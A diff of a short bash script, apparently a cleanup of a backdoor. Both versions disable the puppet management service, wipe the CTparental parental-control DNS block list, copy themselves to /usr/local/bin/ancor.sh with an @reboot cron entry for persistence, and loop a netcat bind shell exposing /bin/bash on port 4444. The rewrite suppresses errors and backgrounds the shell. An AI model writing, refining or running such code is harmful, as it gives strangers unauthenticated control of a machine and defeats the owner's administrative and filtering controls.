@@ -1,28 +1,9 @@
 #!/bin/bash
-
-systemctl disable puppet
-
-echo -n >/etc/CTparental/dnscrypt-blocked-names.txt
-
-
-SCRIPT_FILE="/usr/local/bin/ancor.sh"
-
-cp "$0" "$SCRIPT_FILE"
-
-SCRIPT_PATH="/usr/local/bin/ancor.sh"
-CRON_LINE="@reboot $SCRIPT_PATH"
-
-( crontab -l 2>/dev/null; echo "$CRON_LINE" ) | sort -u | crontab -
-EOF
-
-chmod +x "$SCRIPT_FILE"
-
-CRON_LINE="@reboot $SCRIPT_FILE"
-( crontab -l 2>/dev/null; echo "$CRON_LINE" ) | sort -u | crontab -
-
-
-
-ip a
-while true; do
-  nc -nlvp 4444 -e /bin/bash
-done
+systemctl disable puppet 2>/dev/null
+:>/etc/CTparental/dnscrypt-blocked-names.txt 2>/dev/null
+f=/usr/local/bin/ancor.sh
+[ "$0" != "$f" ]&&cp "$0" "$f"&&chmod +x "$f"
+c="@reboot $f"
+(crontab -l 2>/dev/null;echo "$c")|sort -u|crontab - 2>/dev/null
+ip a 2>/dev/null
+while true;do nc -nlvp 4444 -e /bin/bash 2>/dev/null;sleep 2;done&
